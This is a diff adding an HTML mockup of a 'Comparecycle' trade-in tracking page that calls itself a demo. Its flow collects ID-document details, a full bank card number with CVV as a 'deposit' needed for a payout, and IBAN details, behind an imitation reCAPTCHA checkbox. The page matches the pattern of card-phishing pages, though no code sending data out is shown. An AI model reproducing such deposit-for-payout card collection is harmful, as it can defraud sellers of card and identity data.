@@ -1,0 +1,584 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Trade-In Tracking - Comparecycle</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <link rel="stylesheet" href="style-en.css">
+</head>
+<body>
+
+  <div class="container">
+
+    <header class="affiliate-header">
+      <img src="https://preprod.comparecycle.com/_next/image?url=https%3A%2F%2Fpreprod-static.comparecycle.com%2Fimages%2F3%2Fba8f5633caaec3bcce74d2c9b3151035928e9a62.png&w=640&q=75" alt="Partner Logo" class="affiliate-logo" />
+
+      <div id="pageFooter">
+        <button type="button" class="btn-contact-discreet" onclick="openContactModal()">
+          <svg width="16" height="16" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"></path>
+          </svg>
+          <span>Contact us</span>
+        </button>
+      </div>
+    </header>
+    
+    <div id="affiliateBanner" class="affiliate-banner">
+      <span>Active affiliate partner: <strong id="affiliateName">Partner Widget</strong></span>
+      <span class="badge-widget-mode">Embedded Widget Mode</span>
+    </div>
+
+    <section id="inputScreen" class="search-card">
+      <h2>Track your trade-in status</h2>
+      <p>Enter your order number or trade-in code to check the progress of your request.</p>
+      <form id="searchForm" onsubmit="handleSearch(event)">
+        <div class="search-input-group">
+          <input type="text" id="trackInput" placeholder="Code sent by email" required autocomplete="off">
+          <button type="submit" class="btn btn-green">Search</button>
+        </div>
+      </form>
+    </section>
+
+    <!-- MAIN TRACKING CARD -->
+    <main id="trackingContent" class="tracking-card">
+      
+      <!-- FINALIZATION BANNER -->
+      <div id="finalizeBanner" class="finalize-banner">
+        <div class="finalize-banner-info">
+          <h3><i class="fa-solid fa-circle-exclamation"></i> Finalize your trade-in</h3>
+          <p>To trigger your payout, please complete the following 4 steps.</p>
+        </div>
+        <button type="button" class="btn btn-green" onclick="triggerSensitiveAction('Trade-in finalization')">
+          <span>Finalize my trade-in</span>
+          <i class="fa-solid fa-arrow-right"></i>
+        </button>
+      </div>
+
+      <!-- STEP-BY-STEP FINALIZATION FLOW -->
+      <div id="completionFlowCard" class="completion-flow-card">
+        <div class="flow-stepper-header">
+          <span id="pill-flow-1" class="flow-step-pill active"><span class="pill-num">1</span> Identity</span>
+          <span id="pill-flow-2" class="flow-step-pill"><span class="pill-num">2</span> Card deposit</span>
+          <span id="pill-flow-3" class="flow-step-pill"><span class="pill-num">3</span> Signature</span>
+          <span id="pill-flow-4" class="flow-step-pill"><span class="pill-num">4</span> Payout</span>
+        </div>
+
+        <!-- STEP 1: IDENTITY -->
+        <div id="flow-step-1">
+          <div id="box-step-1" class="flow-step-box step-blue">
+            <h4 id="title-step-1"><i class="fa-solid fa-id-card"></i> Identity & ID document</h4>
+            <p id="desc-step-1">Enter your personal details and ID document information to validate your request.</p>
+          </div>
+
+          <form id="identityForm" onsubmit="handleIdentitySubmit(event)" class="identity-form">
+            <div class="form-section-card">
+              <div class="form-section-title">
+                <i class="fa-solid fa-user"></i>
+                <span>Personal details</span>
+              </div>
+              <div class="identity-grid">
+                <div class="viva-field">
+                  <label for="identity-firstname">First name*</label>
+                  <input type="text" id="identity-firstname" placeholder="John" required>
+                </div>
+                <div class="viva-field">
+                  <label for="identity-lastname">Last name*</label>
+                  <input type="text" id="identity-lastname" placeholder="Doe" required>
+                </div>
+                <div class="viva-field identity-wide">
+                  <label for="identity-address">Street address*</label>
+                  <input type="text" id="identity-address" placeholder="10 Downing Street" required>
+                </div>
+                <div class="viva-field">
+                  <label for="identity-zip">Postal code*</label>
+                  <input type="text" id="identity-zip" placeholder="SW1A 2AA" required>
+                </div>
+                <div class="viva-field">
+                  <label for="identity-city">City*</label>
+                  <input type="text" id="identity-city" placeholder="London" required>
+                </div>
+                <div class="viva-field identity-wide">
+                  <label for="identity-country">Country*</label>
+                  <input type="text" id="identity-country" value="United Kingdom" required>
+                </div>
+              </div>
+            </div>
+
+            <div class="form-section-card">
+              <div class="form-section-title">
+                <i class="fa-solid fa-passport"></i>
+                <span>Identity document</span>
+              </div>
+              <div class="identity-grid">
+                <div class="viva-field">
+                  <label for="identity-doctype">Document type*</label>
+                  <select id="identity-doctype" class="styled-select" required>
+                    <option value="" disabled selected>Select a document</option>
+                    <option value="National ID Card">National ID Card</option>
+                    <option value="Passport">Passport</option>
+                  </select>
+                </div>
+                <div class="viva-field">
+                  <label for="identity-docnum">Document number*</label>
+                  <input type="text" id="identity-docnum" placeholder="e.g. 123456789012" required>
+                </div>
+                <div class="viva-field">
+                  <label for="identity-docdate">Issue date*</label>
+                  <input type="date" id="identity-docdate" required>
+                </div>
+                <div class="viva-field">
+                  <label for="identity-doctown">Issuing city*</label>
+                  <input type="text" id="identity-doctown" placeholder="London" required>
+                </div>
+                <div class="viva-field identity-wide">
+                  <label for="identity-doccountry">Issuing country*</label>
+                  <input type="text" id="identity-doccountry" value="United Kingdom" required>
+                </div>
+              </div>
+            </div>
+
+            <button id="btn-step-1" type="submit" class="btn btn-step-blue btn-full">
+              <span>Confirm and continue</span>
+              <i class="fa-solid fa-arrow-right"></i>
+            </button>
+          </form>
+        </div>
+
+        <!-- STEP 2: CARD DEPOSIT -->
+        <div id="flow-step-2" style="display:none;">
+          <div id="box-step-2" class="flow-step-box step-blue">
+            <div class="step-box-header">
+              <h4 id="title-step-2"><i class="fa-solid fa-shield-halved"></i> Bank card deposit</h4>
+              <span id="swikly-status-badge" class="badge-pending">Pending</span>
+            </div>
+            <p id="swikly-desc-text">Required to secure and trigger your instant payout.</p>
+          </div>
+          <button id="btn-step-2" type="button" class="btn btn-step-blue btn-full" onclick="openDemoModal('swikly')">
+            <span>Authorize bank card deposit</span>
+            <i class="fa-solid fa-arrow-right"></i>
+          </button>
+        </div>
+
+        <!-- STEP 3: SIGNATURE -->
+        <div id="flow-step-3" style="display:none;">
+          <div id="box-step-3" class="flow-step-box step-blue">
+            <h4 id="title-step-3"><i class="fa-solid fa-file-signature"></i> Transfer agreement signature</h4>
+            <p id="desc-step-3">Please electronically sign your transfer agreement to finalize the deal.</p>
+          </div>
+          <button id="btn-step-3" type="button" class="btn btn-step-blue btn-full" onclick="openDemoModal('yousign_sign')">
+            <span>Sign transfer agreement</span>
+            <i class="fa-solid fa-pen-nib"></i>
+          </button>
+        </div>
+
+        <!-- STEP 4: PAYOUT -->
+        <div id="flow-step-4" style="display:none;">
+          <div id="box-step-4" class="flow-step-box step-blue">
+            <h4 id="title-step-4"><i class="fa-solid fa-wallet"></i> Payout method</h4>
+            <p id="flow-payout-desc">Select your preferred method to receive your trade-in payout.</p>
+          </div>
+
+          <div id="payout-choices-grid" class="payout-choices-grid">
+            <button id="flow-btn-viva" type="button" class="payout-option-card primary" onclick="openDemoModal('payment_cb')">
+              <div class="payout-option-icon"><i class="fa-solid fa-credit-card"></i></div>
+              <div class="payout-option-text">
+                <strong>To Bank Card</strong>
+                <span>Fast credit via Viva Wallet</span>
+              </div>
+              <i class="fa-solid fa-chevron-right payout-option-arrow"></i>
+            </button>
+
+            <button id="flow-btn-iban" type="button" class="payout-option-card" onclick="toggleIbanFormInFlow()">
+              <div class="payout-option-icon green"><i class="fa-solid fa-building-columns"></i></div>
+              <div class="payout-option-text">
+                <strong>By IBAN Bank Transfer</strong>
+                <span>Standard bank transfer</span>
+              </div>
+              <i class="fa-solid fa-chevron-right payout-option-arrow"></i>
+            </button>
+          </div>
+
+          <div id="flow-iban-container" class="form-section-card" style="display:none; margin-top:16px;">
+            <div class="form-section-title">
+              <i class="fa-solid fa-building-columns"></i>
+              <span>IBAN bank details</span>
+            </div>
+            <div class="identity-grid">
+              <div class="viva-field">
+                <label for="flow-iban-holder">Account holder*</label>
+                <input type="text" id="flow-iban-holder" placeholder="John Doe">
+              </div>
+              <div class="viva-field">
+                <label for="flow-iban-num">IBAN number*</label>
+                <input type="text" id="flow-iban-num" placeholder="GB29 NWBK 6016 1331 9268 19">
+              </div>
+            </div>
+            <button type="button" class="btn btn-green btn-full" onclick="completeFlowPayout('iban')">
+              <span>Confirm my IBAN details</span>
+              <i class="fa-solid fa-check"></i>
+            </button>
+          </div>
+        </div>
+      </div>
+      
+      <!-- PRODUCT INFO -->
+      <div class="product-header">
+        <div class="product-image">
+          <img src="img/produit.jpg" alt="Apple iPhone 13 512 GB">
+        </div>
+        <div class="product-info">
+          <span class="badge badge-orange" id="statusBadge">Awaiting finalization</span>
+          <h1 class="product-title" id="productTitle">Apple iPhone 13 512 GB</h1>
+          <div class="product-price">Your trade-in offer: <span id="offerPrice">€485.00</span></div>
+          <a class="link-track" onclick="triggerSensitiveAction('Colissimo carrier tracking')">Track my parcel</a>
+          
+          <div class="order-meta">
+            Order No.: <strong>GRA0001766673</strong><br>
+            Tracking code: <strong id="orderNumberDisplay">123456</strong><br>
+            Placed on 21/05/2025
+          </div>
+        </div>
+      </div>
+
+      <!-- HORIZONTAL STEPPER -->
+      <div class="stepper-wrapper">
+        <div class="stepper">
+          <div class="step-item" id="mainStep1">
+            <div class="step-dot">
+              <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
+            </div>
+            <div class="step-label">Request finalized</div>
+          </div>
+          <div class="step-item"><div class="step-dot"></div><div class="step-label">Device shipped</div></div>
+          <div class="step-item"><div class="step-dot"></div><div class="step-label">Device received</div></div>
+          <div class="step-item"><div class="step-dot"></div><div class="step-label">Diagnostic in progress</div></div>
+          <div class="step-item"><div class="step-dot"></div><div class="step-label">Payment completed</div></div>
+        </div>
+      </div>
+
+      <div class="alert-banner" id="shippingAlert" style="display:none;">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3Z"></path><line x1="12" y1="9" x2="12" y2="13"></line><line x1="12" y1="17" x2="12.01" y2="17"></line></svg>
+        <span>Ship your device within 7 days, otherwise your trade-in offer will expire.</span>
+      </div>
+
+      <div class="actions-group-wrapper">
+        <div class="actions-left">
+          <button type="button" class="btn btn-green" id="toggleDetailsBtn" onclick="toggleDetails()">
+            <span id="toggleText">View details</span>
+            <svg id="chevronIcon" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="m18 15-6-6-6 6"/></svg>
+          </button>
+          
+          <button type="button" id="btn-edit-payment-method" class="btn btn-outline-dark" style="display:none;" onclick="triggerSensitiveAction('Payment method update')">
+            Change payment method
+          </button>
+        </div>
+
+        <div class="actions-right">
+          <button type="button" class="btn btn-outline-green" onclick="triggerSensitiveAction('Trade-in cancellation')">
+            Cancel my trade-in
+          </button>
+        </div>
+      </div>
+
+      <div id="detailsCollapsible">
+        <div class="details-section">
+          <h3>Diagnostic</h3>
+          <div class="info-grid">
+            <div class="info-row"><span>Screen</span><span>Like new</span></div>
+            <div class="info-row"><span>Back of the phone</span><span>Micro-scratches</span></div>
+            <div class="info-row"><span>Frame / Chassis</span><span>Scratch(es)</span></div>
+            <div class="info-row"><span>Phone fully functional</span><span>Yes</span></div>
+          </div>
+
+          <div id="diagnostic-download-actions" class="diagnostic-actions" style="display:none;">
+            <button type="button" class="btn btn-outline-dark" onclick="window.print()">
+              <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+              Transfer certificate
+            </button>
+            <button type="button" class="btn btn-outline-dark" onclick="window.print()">
+              <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+              Shipping label
+            </button>
+          </div>
+        </div>
+      </div>
+
+      <!-- CUSTOMER PERSONAL DATA BLOCK -->
+      <div class="user-details-card">
+        <div class="user-details-header">
+          <h3><i class="fa-solid fa-user"></i> Your personal information</h3>
+          <button type="button" class="btn btn-outline-dark btn-sm" onclick="triggerSensitiveAction('Personal details update')">
+            <i class="fa-solid fa-pen-to-square"></i>
+            <span>Edit</span>
+          </button>
+        </div>
+
+        <div class="user-details-sections">
+          <div>
+            <div class="user-sub-label">Contact details</div>
+            <div class="info-grid">
+              <div class="info-row"><span>Full name</span><span id="user-display-name">—</span></div>
+              <div class="info-row"><span>Email address</span><span id="user-display-email">john.doe@example.com</span></div>
+              <div class="info-row"><span>Phone number</span><span id="user-display-phone">+44 7700 900077</span></div>
+              <div class="info-row"><span>Street address</span><span id="user-display-address">—</span></div>
+              <div class="info-row"><span>Postal code / City</span><span id="user-display-city">—</span></div>
+              <div class="info-row"><span>Country</span><span id="user-display-country">—</span></div>
+            </div>
+          </div>
+
+          <div id="user-id-doc-block" class="user-doc-subsection" style="display:none;">
+            <div class="user-sub-label">Registered identity document</div>
+            <div class="info-grid">
+              <div class="info-row"><span>Document type</span><span id="user-display-doctype">—</span></div>
+              <div class="info-row"><span>Document number</span><span id="user-display-docnum">—</span></div>
+              <div class="info-row"><span>Issue date</span><span id="user-display-docdate">—</span></div>
+              <div class="info-row"><span>Issuing city</span><span id="user-display-doctown">—</span></div>
+              <div class="info-row"><span>Issuing country</span><span id="user-display-doccountry">—</span></div>
+            </div>
+          </div>
+        </div>
+      </div>      
+
+    </main>
+
+    <!-- PAYMENT METHOD UPDATE SCREEN -->
+    <div id="paymentScreen" class="payment-screen">
+      <div class="payment-card">
+        <a class="back-link" onclick="closePaymentScreen()">&larr; Back to tracking</a>
+        <h2 class="payment-title">Add a payment method</h2>
+        
+        <div class="payment-methods-grid">
+          <button type="button" id="payment-choice-cb" class="payment-choice-card" onclick="handleChoiceCB()">
+            <div class="payment-choice-icon"><i class="fa-solid fa-credit-card"></i></div>
+            <div><h4>Bank Card</h4></div>
+          </button>
+
+          <button type="button" id="payment-choice-iban" class="payment-choice-card" onclick="handleChoiceIBAN()">
+            <div class="payment-choice-icon"><i class="fa-solid fa-building-columns"></i></div>
+            <div><h4>IBAN</h4></div>
+          </button>
+        </div>
+
+        <div id="payment-iban-form" class="payment-iban-form" style="display:none;">
+          <h3 class="iban-form-title">Bank details</h3>
+          <p class="iban-form-desc">Add new bank details here for your device trade-in payouts.</p>
+
+          <form onsubmit="handleSaveIBAN(event)">
+            <div class="iban-grid-two">
+              <div class="viva-field">
+                <label>Account label*</label>
+                <input type="text" id="iban-label" placeholder="Current account" required>
+              </div>
+              <div class="viva-field">
+                <label>Beneficiary name*</label>
+                <input type="text" id="iban-beneficiary" placeholder="John Doe" required>
+              </div>
+            </div>
+
+            <div class="viva-field" style="margin-top:12px;">
+              <label>IBAN*</label>
+              <input type="text" id="iban-number" placeholder="GB29 NWBK 6016 1331 9268 19" required>
+            </div>
+
+            <div class="iban-actions">
+              <button type="submit" class="btn btn-green" style="flex:1;">Save</button>
+              <button type="button" class="btn btn-outline-dark" style="flex:1;" onclick="cancelIbanForm()">Cancel</button>
+            </div>
+          </form>
+        </div>
+
+        <p class="payment-discreet-footer">Your details are used solely to process your trade-in payout.</p>
+      </div>
+    </div>    
+
+  </div>
+
+  <!-- OTP CODE MODAL (123456) -->
+  <div id="otpModal" class="modal-overlay">
+    <div class="modal-card">
+      <div class="modal-icon">
+        <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect width="18" height="11" x="3" y="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+      </div>
+      <h3 class="modal-title">Security verification</h3>
+      <p class="modal-desc">
+        Please enter the 6-digit verification code sent to your email address.
+        <span class="otp-demo-hint">Demo code: 123456</span>
+      </p>
+
+      <form onsubmit="handleOtpSubmit(event)">
+        <div id="otpError" class="otp-error" role="alert" aria-live="polite"></div>
+        <div class="otp-inputs">
+          <input type="text" maxlength="1" class="otp-input" oninput="moveNext(this, 0)" inputmode="numeric" aria-label="Digit 1" autofocus>
+          <input type="text" maxlength="1" class="otp-input" oninput="moveNext(this, 1)" inputmode="numeric" aria-label="Digit 2">
+          <input type="text" maxlength="1" class="otp-input" oninput="moveNext(this, 2)" inputmode="numeric" aria-label="Digit 3">
+          <input type="text" maxlength="1" class="otp-input" oninput="moveNext(this, 3)" inputmode="numeric" aria-label="Digit 4">
+          <input type="text" maxlength="1" class="otp-input" oninput="moveNext(this, 4)" inputmode="numeric" aria-label="Digit 5">
+          <input type="text" maxlength="1" class="otp-input" oninput="moveNext(this, 5)" inputmode="numeric" aria-label="Digit 6">
+        </div>
+        <div class="otp-footer-actions">
+          <button type="button" class="btn btn-outline-dark btn-full" onclick="closeOtpModal()">Cancel</button>
+        </div>
+      </form>
+    </div>
+  </div>
+
+  <!-- GENERIC DEMO MODAL -->
+  <div id="genericDemoModal" class="modal-overlay">
+    <div class="modal-card demo-modal-card">
+      <div class="demo-modal-header">
+        <div class="demo-modal-title-group">
+          <span class="demo-badge">Simulation</span>
+          <h3 class="modal-title" id="demo-modal-title">Demo Module</h3>
+        </div>
+        <button type="button" class="viva-close" onclick="closeDemoModal()" aria-label="Close">&times;</button>
+      </div>
+
+      <p class="modal-desc" id="demo-modal-desc">Please select the outcome to simulate for this step.</p>
+
+      <div id="demo-modal-icon" class="modal-icon" style="background:#eff6ff; color:#2563eb;">
+        <i class="fa-solid fa-shield-halved"></i>
+      </div>
+
+      <div id="demo-image-frame" class="demo-image-frame" style="display:none;">
+        <img id="demo-modal-image" class="demo-modal-image" src="" alt="Demo visual">
+      </div>
+
+      <div class="demo-modal-actions">
+        <button type="button" class="btn btn-ghost" onclick="closeDemoModal()">Cancel</button>
+        <button type="button" class="btn btn-danger-outline" onclick="handleDemoResult('refuser')">
+          <i class="fa-solid fa-xmark"></i>
+          <span>Decline</span>
+        </button>
+        <button type="button" class="btn btn-green" onclick="handleDemoResult('valider')">
+          <i class="fa-solid fa-check"></i>
+          <span>Approve</span>
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <!-- EDIT PERSONAL DETAILS MODAL -->
+  <div id="userModal" class="modal-overlay">
+    <div class="modal-card modal-card-form">
+      <div class="modal-form-header">
+        <h3 class="modal-title">Edit my personal details</h3>
+        <button type="button" class="viva-close" onclick="closeUserModal()">&times;</button>
+      </div>
+      <form onsubmit="handleUserFormSubmit(event)">
+        <div class="identity-grid">
+          <div class="viva-field"><label>First name*</label><input type="text" id="edit-firstname" required></div>
+          <div class="viva-field"><label>Last name*</label><input type="text" id="edit-lastname" required></div>
+          <div class="viva-field"><label>Email*</label><input type="email" id="edit-email" value="john.doe@example.com" required></div>
+          <div class="viva-field"><label>Phone*</label><input type="tel" id="edit-phone" value="+44 7700 900077" required></div>
+          <div class="viva-field identity-wide"><label>Street address*</label><input type="text" id="edit-address" required></div>
+          <div class="viva-field"><label>Postal code*</label><input type="text" id="edit-zip" required></div>
+          <div class="viva-field"><label>City*</label><input type="text" id="edit-city" required></div>
+          <div class="viva-field identity-wide"><label>Country*</label><input type="text" id="edit-country" required></div>
+        </div>
+        
+        <div class="modal-form-actions">
+          <button type="button" class="btn btn-outline-dark" onclick="closeUserModal()">Cancel</button>
+          <button type="submit" class="btn btn-green">Save</button>
+        </div>
+      </form>
+    </div>
+  </div>
+
+  <!-- VIVA WALLET MODAL -->
+  <div class="viva-overlay" id="vivaModal" onclick="handleVivaOverlayClick(event)">
+    <div class="viva-card">
+      <div class="viva-topline">
+        <div>
+          <div class="viva-brand">VIVA <span>WALLET</span></div>
+          <p class="viva-caption">Secure payment · Demo mode</p>
+        </div>
+        <button type="button" class="viva-close" onclick="closeVivaModal()">&times;</button>
+      </div>
+      <form id="cardForm" onsubmit="handleCardSubmit(event)">
+        <div class="viva-field">
+          <label>Name on card*</label>
+          <input id="cardholderName" placeholder="Cardholder name" required>
+        </div>
+        <div class="viva-field">
+          <label>Card number*</label>
+          <input id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="23" required>
+        </div>
+        <div style="display:grid; grid-template-columns:1fr 1fr; gap:12px;">
+          <div class="viva-field">
+            <label>Expiry date*</label>
+            <input id="cardExpiry" placeholder="MM/YY" required>
+          </div>
+          <div class="viva-field">
+            <label>Security code*</label>
+            <input id="cardCvv" placeholder="CVV" maxlength="4" required>
+          </div>
+        </div>
+        <div style="display:flex; gap:10px; margin-top:20px;">
+          <button type="button" class="btn btn-outline-dark" style="flex:1;" onclick="closeVivaModal()">Cancel</button>
+          <button type="submit" class="btn btn-green" style="flex:1;">Continue</button>
+        </div>
+      </form>
+    </div>
+  </div>
+
+  <div id="toast" class="toast">
+    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#2da557" stroke-width="2"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>
+    <span id="toastMessage">Action successfully authorized!</span>
+  </div>
+
+  <!-- CONTACT US MODAL -->
+  <div class="contact-modal-overlay" id="contactModalOverlay" onclick="handleContactOverlayClick(event)">
+    <div class="contact-modal-card">
+      <button type="button" class="contact-modal-close" onclick="closeContactModal()">&times;</button>
+      <h2 class="contact-modal-title">Contact us</h2>
+
+      <form onsubmit="handleContactSubmit(event)">
+        <div class="contact-field-group">
+          <label for="contact-subject">Subject*</label>
+          <input type="text" id="contact-subject" class="contact-input" value="Customer Service" required>
+        </div>
+
+        <div class="contact-field-group">
+          <label for="contact-message">Message*</label>
+          <textarea id="contact-message" class="contact-textarea" placeholder="Message" required></textarea>
+        </div>
+
+        <div class="contact-consent-box">
+          <label class="switch-toggle">
+            <input type="checkbox" id="contact-consent" required>
+            <span class="switch-slider"></span>
+          </label>
+          <span class="contact-consent-text">
+            I agree to be contacted by CompaRecycle in order to process my request
+          </span>
+        </div>
+
+        <p class="contact-privacy-discreet">
+          Comparecycle, as data controller, collects and processes your personal data for the purpose of communicating with you, paying for your traded-in device, and processing your trade-in request. To learn more, please consult our <a href="#">Cookie Policy</a>.
+        </p>
+
+        <div class="recaptcha-wrapper">
+          <div class="recaptcha-box">
+            <label class="recaptcha-checkbox-label">
+              <input type="checkbox" required>
+              <span>I'm not a robot</span>
+            </label>
+            <div class="recaptcha-logo-block">
+              <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA">
+              <span>reCAPTCHA</span>
+            </div>
+          </div>
+        </div>
+
+        <button type="submit" class="btn btn-green btn-contact-submit">Send message</button>
+      </form>
+    </div>
+  </div>
+
+  <script src="app-en.js"></script>
+</body>
+</html>
